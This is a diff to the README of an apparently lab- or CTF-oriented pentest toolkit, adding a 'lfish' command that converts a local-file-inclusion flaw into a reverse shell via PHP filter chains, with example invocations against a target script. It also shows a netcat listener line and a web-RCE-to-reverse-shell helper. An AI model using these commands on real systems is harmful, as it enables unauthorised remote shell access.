@@ -521,6 +521,7 @@ See [docs/Metasploit.md](docs/Metasploit.md).
 | `listen -l [port]` | Save connection log to `cases/.../logs/revshell_*` |
 | `listen -d [port]` | Receive `tar` stream and extract under `cases/<room>/exports/listen_<ts>/` (`nc -lvnp PORT | tar xf - -C ...`); also prints target-side send command |
 | `webrsh [options] [path\|url]` | Web RCE -> reverse shell (`?cmd=` / POST). LHOST auto-detect: `tun0` -> `eth0`. `-u user[:pass]` for HTTP Basic (pass from `cl` if omitted) |
+| `lfish [options] [path\|url]` | LFI/php://filter include -> reverse shell. Builds PHP filter chain internally, defaults `LHOST=lhost`, `LPORT=4444`, shell type `proc` (`-t proc|bash|nc`) |
 
 Before `ftp-revshell`, start `listen` in **another terminal**.
 
@@ -565,6 +566,9 @@ ftp-revshell
 # or
 ftp-revshell -d ftp -w /files
 ftp-revshell -U http://10.49.140.156/files/ftp/shell.php -u
+lfish http://$IP/secret-script.php -p file
+lfish /secret-script.php -p file -t bash
+lfish /secret-script.php -p page -X POST -P 5555
 ```
 
 Details: `ftp-revshell -h`
@@ -865,6 +869,7 @@ sshkey-crack -h
 gpg-crack -h
 upload-shell -h
 webrsh -h
+lfish -h
 msfr -h
 postcmd -h
 enc -h
